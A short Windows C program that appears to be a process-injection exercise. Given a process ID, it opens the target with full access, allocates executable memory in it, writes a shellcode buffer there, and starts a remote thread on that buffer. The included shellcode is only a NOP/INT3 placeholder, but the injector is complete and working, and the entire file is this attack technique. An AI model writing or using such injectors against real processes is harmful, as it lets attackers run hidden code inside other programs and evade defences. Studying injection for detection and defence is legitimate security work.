#include <windows.h>
#include <stdio.h>

const char* k = "[+]";
const char* i = "[+]";
const char* e = "[-]";

DWORD PID, TID = NULL;
LPVOID rBuffer = NULL;
HANDLE hProcess, hThread = NULL;

// Proper shellcode as raw bytes, not string
unsigned char shellcode[] = { 0x90, 0x90, 0x90, 0xCC }; // NOP NOP NOP INT3

int main(int argc, char* argv[]) {
	if (argc < 2) {
		printf("%s Usage: program.exe <PID>\n", e);
		return EXIT_FAILURE;
	}

	PID = atoi(argv[1]);
	printf("%s Attempting to open handle to process %ld\n", i, PID);

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (hProcess == NULL) {
		printf("%s Failed to get handle to %ld, error code: %ld\n", e, PID, GetLastError());
		return EXIT_FAILURE;
	}
	printf("%s Got handle to process %ld\n", k, PID);

	// Allocate memory in remote process
	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (rBuffer == NULL) {
		printf("%s Failed to allocate memory, error code: %ld\n", e, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}
	printf("%s Allocated %zu bytes at address %p in process %ld\n", k, sizeof(shellcode), rBuffer, PID);

	// Write shellcode to remote process
	BOOL wpm = WriteProcessMemory(hProcess, rBuffer, shellcode, sizeof(shellcode), NULL);
	if (!wpm) {
		printf("%s Failed to write shellcode, error code: %ld\n", e, GetLastError());
		VirtualFreeEx(hProcess, rBuffer, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}
	printf("%s Successfully wrote shellcode to process %ld\n", k, PID);

	// Create thread in remote process
	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);
	if (hThread == NULL) {
		printf("%s Failed to create remote thread, error code: %ld\n", e, GetLastError());
		VirtualFreeEx(hProcess, rBuffer, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}
	printf("%s Created remote thread in process %ld with TID: %ld\n", k, PID, TID);

	// Clean up
	CloseHandle(hThread);
	CloseHandle(hProcess);
	printf("%s Injection complete. Cleaning up.\n", k);

	return EXIT_SUCCESS;
}
